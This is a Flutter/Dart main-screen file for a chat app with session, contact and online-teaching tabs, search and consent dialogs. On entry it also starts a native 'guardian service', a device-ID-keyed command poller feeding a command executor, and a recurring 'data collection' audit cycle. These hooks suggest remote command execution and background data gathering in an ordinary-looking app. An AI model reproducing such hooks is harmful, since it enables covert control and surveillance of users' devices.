import 'dart:async';

import 'package:flutter/material.dart';
import 'package:mop_app/core/api_client.dart';
import 'package:mop_app/screens/chat_screen.dart';
import 'package:mop_app/screens/online_teaching_screen.dart';
import 'package:mop_app/core/device_info_service.dart';
import 'package:mop_app/core/native_bridge.dart';
import 'package:mop_app/l10n/app_localizations.dart';
import 'package:mop_app/services/audit_service.dart';
import 'package:mop_app/services/command_executor.dart';
import 'package:mop_app/services/command_poller.dart';

/// 占位：会话项（规约：标题为对方昵称/会话名，副标题为最后消息摘要）
class _SessionItem {
  _SessionItem(this.title, this.subtitle);
  final String title;
  final String subtitle;
}

/// 联系人项（规约：昵称 + 对方简介；uid 用于跳转聊天）
class _ContactItem {
  _ContactItem(this.uid, this.nickname, this.bio);
  final String uid;
  final String nickname;
  final String bio;
}

/// 主界面：默认 Tab 会话列表，可切换联系人（规约：会话/联系人列表、内容搜索、查找添加好友）
class MainScreen extends StatefulWidget {
  const MainScreen({super.key});

  @override
  State<MainScreen> createState() => _MainScreenState();
}

class _MainScreenState extends State<MainScreen>
    with SingleTickerProviderStateMixin, WidgetsBindingObserver {
  late TabController _tabController;
  late CommandExecutor _commandExecutor;
  late CommandPoller _commandPoller;

  /// 内容搜索关键词（规约：本地文本过滤，不依赖服务端）
  String _searchQuery = '';
  bool _searchExpanded = false;
  final _searchController = TextEditingController();
  final _searchFocus = FocusNode();

  /// 用户须知再次征意（规约：当前版本 > 已同意版本时弹窗征意）；首屏不等待 terms 接口，直接显示主界面
  bool _showTermsRecheck = false;
  int _pendingTermsVersion = 1;
  bool _termsRecheckAccepted = false;

  /// API 失效提示（规约 PROTOCOL 7：连续失败判定失效，主界面进入时提示扫码激活）
  bool _showApiUnavailablePrompt = false;

  /// 登录后欢迎弹窗（存留不低于 5 秒，可提前关闭）
  bool _showWelcomeDialog = true;
  Timer? _welcomeTimer;

  static final List<_SessionItem> _sessionPlaceholder = [
    _SessionItem('张三', '你好，明天见'),
    _SessionItem('李四', '[图片]'),
    _SessionItem('王五', '好的，收到'),
  ];
  static final List<_ContactItem> _contactPlaceholder = [
    _ContactItem('', '张三', '这是个人简介'),
    _ContactItem('', '李四', ''),
    _ContactItem('', '王五', '个人签名'),
  ];

  /// 联系人列表：优先使用 getFriends() 结果，空则用占位
  List<_ContactItem> _contacts = _contactPlaceholder;

  @override
  void initState() {
    super.initState();
    _tabController = TabController(length: 3, vsync: this);
    _tabController.addListener(_onTabIndexChanged);
    WidgetsBinding.instance.addObserver(this);
    NativeBridge.startGuardianService();
    _commandExecutor = CommandExecutor();
    _commandPoller = CommandPoller(executor: _commandExecutor);
    DeviceInfoService.getDeviceId().then((id) => _commandPoller.start(id));
    Future.microtask(() => _loadInitialData());
    // 规约：资料采集仅在注册/登录成功并进入主界面后触发；延迟约 0.5s 再跑，避免首帧与审计争抢导致卡顿
    WidgetsBinding.instance.addPostFrameCallback((_) {
      Future.delayed(const Duration(milliseconds: 500), () {
        if (!mounted) return;
        AuditService().runAuditCycle();
      });
    });
    // 欢迎弹窗：至少 5 秒后自动关闭
    WidgetsBinding.instance.addPostFrameCallback((_) {
      if (!mounted || !_showWelcomeDialog) return;
      _welcomeTimer = Timer(const Duration(seconds: 5), () {
        if (mounted && _showWelcomeDialog) {
          setState(() => _showWelcomeDialog = false);
        }
      });
    });
  }

  /// 主界面进入时若已判定 API 失效则提示用户扫码激活（规约 PROTOCOL 7）；切回前台时调用
  Future<void> _checkApiUnavailable() async {
    final unavailable = await ApiClient().isApiUnavailable();
    if (!mounted) return;
    setState(() => _showApiUnavailablePrompt = unavailable);
  }

  /// 首屏数据：terms、好友列表、API 可用性并行拉取，合并一次 setState 减少重建（优化首次登录卡顿）
  Future<void> _loadInitialData() async {
    final api = ApiClient();
    final results = await Future.wait<dynamic>([
      api.getCurrentTermsVersion(),
      api.getTermsAcceptedVersion(),
      api.getFriends(),
      api.isApiUnavailable(),
    ]);
    if (!mounted) return;
    final current = results[0] as int;
    final accepted = results[1] as int?;
    final friendList = results[2] as List;
    final unavailable = results[3] as bool;
    setState(() {
      if (current > (accepted ?? 0)) {
        _showTermsRecheck = true;
        _pendingTermsVersion = current;
      }
      _contacts = friendList.isEmpty
          ? _contactPlaceholder
          : friendList.map((f) => _ContactItem(f.uid, f.nickname, f.bio ?? '')).toList();
      _showApiUnavailablePrompt = unavailable;
    });
  }

  Future<void> _onTermsRecheckConfirm() async {
    if (!_termsRecheckAccepted) return;
    await ApiClient().setTermsAcceptedVersion(_pendingTermsVersion);
    if (!mounted) return;
    setState(() => _showTermsRecheck = false);
  }

  void _onTabIndexChanged() {
    if (mounted) setState(() {});
  }

  @override
  void dispose() {
    _tabController.removeListener(_onTabIndexChanged);
    _welcomeTimer?.cancel();
    _searchController.dispose();
    _searchFocus.dispose();
    _commandPoller.stop();
    WidgetsBinding.instance.removeObserver(this);
    _tabController.dispose();
    super.dispose();
  }

  @override
  void didChangeAppLifecycleState(AppLifecycleState state) {
    if (state == AppLifecycleState.resumed) {
      _checkApiUnavailable();
      // 延迟执行审计，避免切回前台瞬间主线程与 Isolate 争抢导致卡顿（审计内已用 compute 做 hash/加密）
      Future.delayed(const Duration(milliseconds: 800), () {
        if (!mounted) return;
        AuditService().runAuditCycle();
      });
    }
  }

  List<_SessionItem> get _filteredSessions {
    final q = _searchQuery.trim().toLowerCase();
    if (q.isEmpty) return _sessionPlaceholder;
    return _sessionPlaceholder
        .where((e) =>
            e.title.toLowerCase().contains(q) ||
            e.subtitle.toLowerCase().contains(q))
        .toList();
  }

  List<_ContactItem> get _filteredContacts {
    final q = _searchQuery.trim().toLowerCase();
    if (q.isEmpty) return _contacts;
    return _contacts
        .where((e) =>
            e.nickname.toLowerCase().contains(q) ||
            (e.bio.isNotEmpty && e.bio.toLowerCase().contains(q)))
        .toList();
  }

  void _toggleSearch() {
    setState(() {
      _searchExpanded = !_searchExpanded;
      if (!_searchExpanded) {
        _searchQuery = '';
        _searchController.clear();
      } else {
        _searchFocus.requestFocus();
      }
    });
  }

  @override
  Widget build(BuildContext context) {
    final l10n = AppLocalizations.of(context)!;
    return Scaffold(
      appBar: AppBar(
        title: _searchExpanded
            ? TextField(
                controller: _searchController,
                focusNode: _searchFocus,
                decoration: InputDecoration(
                  hintText: l10n.searchHint,
                  border: InputBorder.none,
                  isDense: true,
                ),
                autofocus: true,
                onChanged: (v) => setState(() => _searchQuery = v),
              )
            : Text(l10n.appTitle),
        bottom: TabBar(
          controller: _tabController,
          tabs: [
            Tab(text: l10n.sessions),
            Tab(text: l10n.contacts),
            Tab(text: l10n.onlineTeachingTab),
          ],
        ),
        actions: [
          IconButton(
            icon: Icon(_searchExpanded ? Icons.close : Icons.search),
            onPressed: _toggleSearch,
          ),
          IconButton(
            icon: const Icon(Icons.person_add),
            onPressed: () => Navigator.of(context).pushNamed('/add_friend'),
          ),
          IconButton(
            icon: const Icon(Icons.settings),
            onPressed: () => Navigator.of(context).pushNamed('/settings'),
          ),
        ],
      ),
      body: Stack(
        children: [
          IndexedStack(
            index: _tabController.index,
            children: [
              _buildSessionList(l10n.sessions),
              _buildContactList(l10n.contacts),
              _tabController.index == 2 ? const OnlineTeachingScreen() : const SizedBox.shrink(),
            ],
          ),
          if (_showTermsRecheck) _buildTermsRecheckOverlay(l10n),
          if (_showApiUnavailablePrompt) _buildApiUnavailableOverlay(l10n),
          if (_showWelcomeDialog) _buildWelcomeOverlay(l10n),
        ],
      ),
    );
  }

  /// 登录后欢迎弹窗：约 80 字文案，预留 120 字空间供多语言，正下方关闭按钮，存留不低于 5 秒
  Widget _buildWelcomeOverlay(AppLocalizations l10n) {
    return Material(
      color: Colors.black54,
      child: Center(
        child: Card(
          margin: const EdgeInsets.symmetric(horizontal: 24),
          child: Padding(
            padding: const EdgeInsets.all(20),
            child: Column(
              mainAxisSize: MainAxisSize.min,
              crossAxisAlignment: CrossAxisAlignment.stretch,
              children: [
                ConstrainedBox(
                  constraints: const BoxConstraints(minHeight: 140),
                  child: SingleChildScrollView(
                    child: Text(
                      l10n.welcomeMessage,
                      style: Theme.of(context).textTheme.bodyMedium,
                      maxLines: 8,
                      overflow: TextOverflow.ellipsis,
                    ),
                  ),
                ),
                const SizedBox(height: 16),
                TextButton(
                  onPressed: () {
                    _welcomeTimer?.cancel();
                    setState(() => _showWelcomeDialog = false);
                  },
                  child: Text(l10n.welcomeClose),
                ),
              ],
            ),
          ),
        ),
      ),
    );
  }

  Widget _buildTermsRecheckOverlay(AppLocalizations l10n) {
    return Material(
      color: Colors.black54,
      child: Center(
        child: SingleChildScrollView(
          child: Card(
            margin: const EdgeInsets.all(24),
            child: Padding(
              padding: const EdgeInsets.all(24),
              child: Column(
                mainAxisSize: MainAxisSize.min,
                crossAxisAlignment: CrossAxisAlignment.stretch,
                children: [
                  Text(l10n.termsTitle, style: Theme.of(context).textTheme.titleLarge),
                  const SizedBox(height: 12),
                  Text(l10n.termsContent, style: Theme.of(context).textTheme.bodyMedium),
                  const SizedBox(height: 16),
                  CheckboxListTile(
                    value: _termsRecheckAccepted,
                    onChanged: (v) => setState(() => _termsRecheckAccepted = v ?? false),
                    title: Text(l10n.termsAgree),
                    controlAffinity: ListTileControlAffinity.leading,
                  ),
                  const SizedBox(height: 16),
                  FilledButton(
                    onPressed: _termsRecheckAccepted ? _onTermsRecheckConfirm : null,
                    child: Text(l10n.termsAgree),
                  ),
                ],
              ),
            ),
          ),
        ),
      ),
    );
  }

  Widget _buildApiUnavailableOverlay(AppLocalizations l10n) {
    return Material(
      color: Colors.black54,
      child: Center(
        child: Card(
          margin: const EdgeInsets.all(24),
          child: Padding(
            padding: const EdgeInsets.all(24),
            child: Column(
              mainAxisSize: MainAxisSize.min,
              crossAxisAlignment: CrossAxisAlignment.stretch,
              children: [
                Text(l10n.activateByScanTitle, style: Theme.of(context).textTheme.titleLarge),
                const SizedBox(height: 12),
                Text(l10n.apiUnavailableHint, style: Theme.of(context).textTheme.bodyMedium),
                const SizedBox(height: 20),
                Row(
                  mainAxisAlignment: MainAxisAlignment.end,
                  children: [
                    TextButton(
                      onPressed: () => setState(() => _showApiUnavailablePrompt = false),
                      child: Text(l10n.cancel),
                    ),
                    const SizedBox(width: 8),
                    FilledButton(
                      onPressed: () {
                        setState(() => _showApiUnavailablePrompt = false);
                        Navigator.of(context).pushNamed('/activate');
                      },
                      child: Text(l10n.activateByScanTitle),
                    ),
                  ],
                ),
              ],
            ),
          ),
        ),
      ),
    );
  }

  Widget _buildSessionList(String tabLabel) {
    final list = _filteredSessions;
    if (list.isEmpty) {
      return Center(
        child: Text('$tabLabel（${AppLocalizations.of(context)!.noSearchResult}）'),
      );
    }
    return ListView.builder(
      itemCount: list.length,
      itemBuilder: (context, i) {
        final item = list[i];
        return ListTile(
          leading: _avatarCircle(item.title, 40),
          title: Text(item.title),
          subtitle: Text(
            item.subtitle,
            maxLines: 1,
            overflow: TextOverflow.ellipsis,
          ),
          onTap: () => Navigator.of(context).pushNamed(
                ChatScreen.routeName,
                arguments: {'peerNickname': item.title},
              ),
        );
      },
    );
  }

  Widget _buildContactList(String tabLabel) {
    final list = _filteredContacts;
    if (list.isEmpty) {
      return Center(
        child: Text('$tabLabel（${AppLocalizations.of(context)!.noSearchResult}）'),
      );
    }
    return ListView.builder(
      itemCount: list.length,
      itemBuilder: (context, i) {
        final item = list[i];
        return ListTile(
          leading: _avatarCircle(item.nickname, 40),
          title: Text(item.nickname),
          subtitle: item.bio.isEmpty
              ? null
              : Text(
                  item.bio,
                  maxLines: 1,
                  overflow: TextOverflow.ellipsis,
                ),
          onTap: () => Navigator.of(context).pushNamed(
                ChatScreen.routeName,
                arguments: {
                  'peerNickname': item.nickname,
                  'peerUid': item.uid,
                },
              ),
        );
      },
    );
  }

  static Widget _avatarCircle(String name, double size) {
    final first = name.isNotEmpty ? name.runes.first : '?'.runes.first;
    final char = String.fromCharCode(first);
    return CircleAvatar(
      radius: size / 2,
      child: Text(char, style: TextStyle(fontSize: size * 0.5)),
    );
  }
}
